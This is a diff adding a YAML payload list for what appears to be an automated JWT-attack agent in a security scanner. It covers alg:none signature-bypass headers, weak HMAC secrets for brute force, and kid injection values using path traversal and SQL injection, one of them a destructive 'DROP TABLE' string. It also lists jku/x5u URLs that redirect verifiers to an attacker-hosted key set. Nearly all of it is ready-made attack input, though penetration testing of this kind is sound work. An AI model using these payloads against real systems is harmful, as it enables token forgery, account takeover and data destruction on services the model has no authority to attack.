@@ -1,0 +1,88 @@
+# JWT attack payloads — seed list for the JWT agent
+#
+# Used when a JWT token is detected in an Authorization header, cookie, or query
+# parameter. The agent attempts alg:none to bypass signature verification, brute-forces
+# common weak HMAC secrets, tests kid parameter injection (path traversal and SQL), and
+# tries jku/x5u header injection to point the verifier at an attacker-controlled JWKS.
+#
+# CALLBACK_URL is replaced at runtime with the collaborator listener URL.
+
+payloads:
+  alg_none:
+    # Each entry is the base64url-encoded JWT header only (no padding).
+    # The agent appends an empty signature and the original claims payload to form a
+    # full token: <header>.<claims_payload>.
+    #
+    # Covers case variations to bypass parsers that compare alg value case-sensitively
+    # rather than using a case-insensitive allow-list.
+    - "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"       # {"alg":"none","typ":"JWT"}
+    - "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0"       # {"alg":"None","typ":"JWT"}
+    - "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0"       # {"alg":"NONE","typ":"JWT"}
+    - "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0"       # {"alg":"nOnE","typ":"JWT"}
+    # Without the typ claim — some libraries only check alg
+    - "eyJhbGciOiJub25lIn0"                        # {"alg":"none"}
+    - "eyJhbGciOiJOT05FIn0"                        # {"alg":"NONE"}
+
+  weak_secrets:
+    # Common HMAC signing secrets to try when brute-forcing HS256/HS384/HS512 tokens.
+    # The agent signs the original claims payload with each secret and submits the
+    # resulting token to check if the server accepts it.
+    - "secret"
+    - "password"
+    - "123456"
+    - "jwt_secret"
+    - "your-256-bit-secret"
+    - "HS256"
+    - "key"
+    - "secret_key"
+    - "jwt"
+    - "admin"
+    - "test"
+    - "dev"
+    - "changeme"
+    - "supersecret"
+    - "mysecret"
+    - "pass"
+    - "token"
+    - "signing_key"
+    - "private"
+    - "1234567890"
+
+  kid_injection:
+    # The kid (key ID) header parameter is used to look up the signing key.
+    # Vulnerable implementations pass it directly to a filesystem read or SQL query.
+    #
+    # Path traversal variants — direct the verifier to read /dev/null or a known file
+    # as the key, resulting in an empty or predictable secret.
+    - "../../dev/null"
+    - "../../../dev/null"
+    - "/dev/null"
+    - "../../../../proc/sys/kernel/randomize_va_space"
+    # SQL injection variants — return an attacker-controlled value as the key
+    - "' OR '1'='1"
+    - "' OR '1'='1'-- -"
+    - "' UNION SELECT 'attacker_key'-- -"
+    - "'; DROP TABLE keys;-- -"
+    - "1 OR 1=1"
+    # Windows path traversal
+    - "..\\..\\..\\windows\\win.ini"
+
+  jku_jwks:
+    # The jku (JWK Set URL) and x5u (X.509 URL) header parameters tell the verifier
+    # where to fetch the public key. If the verifier fetches arbitrary URLs the attacker
+    # can host a crafted JWKS and sign an arbitrary payload.
+    #
+    # CALLBACK_URL is replaced at runtime by the collaborator/listener URL.
+    - "CALLBACK_URL/jwks.json"
+    - "CALLBACK_URL/.well-known/jwks.json"
+    # Open-redirect chain — bypass allow-list checks on the jku domain
+    - "https://trusted.example.com/.well-known/jwks.json@CALLBACK_URL/jwks.json"
+    - "https://trusted.example.com/redirect?url=CALLBACK_URL/jwks.json"
+
+# JWT claim names used to identify tokens and extract subject/role information
+detection_claims:
+  - sub
+  - user
+  - role
+  - admin
+  - email
